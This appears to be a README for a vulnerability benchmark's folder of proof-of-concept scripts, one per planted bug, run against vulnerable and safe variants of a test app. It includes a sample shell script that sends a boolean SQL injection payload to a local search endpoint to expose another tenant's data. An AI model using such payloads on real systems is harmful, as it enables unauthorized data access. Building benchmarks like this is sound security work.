# `verify/` - one runnable PoC per bug

Each PoC is the **executable definition** of a planted bug: it must exit `0`
against the `vuln/` variant and **non-zero** against the `safe/` variant. The
shared `bench verify <stack>` runner walks this folder and reports PASS/FAIL,
and the same double-run (vuln PASS + safe FAIL) is asserted in CI.

## Contract

- Named after the bug id in `VULNERABILITIES.yaml`, lowercased
  (`SQLI-001` → `sqli_001.sh`). Any executable works (`.sh`, `.ts`, `.py`);
  shell + `curl` is the default.
- Reads the target base URL from `$TARGET` (defaults to `http://127.0.0.1:13311`)
  so the same PoC runs against both variants.
- Self-contained: no dependency on other PoCs; safe to run in any order.

## Skeleton (`sqli_001.sh`)

```sh
#!/usr/bin/env sh
set -eu
TARGET="${TARGET:-http://127.0.0.1:13311}"
# SQLi via boolean payload: the injectable endpoint returns all rows.
body=$(curl -s "$TARGET/posts/search?q=%27%20OR%20%271%27%3D%271")
echo "$body" | grep -q "globex-only-post" || { echo "not injectable (safe variant)"; exit 1; }
echo "SQLI-001 confirmed: injection returned cross-tenant row"
```
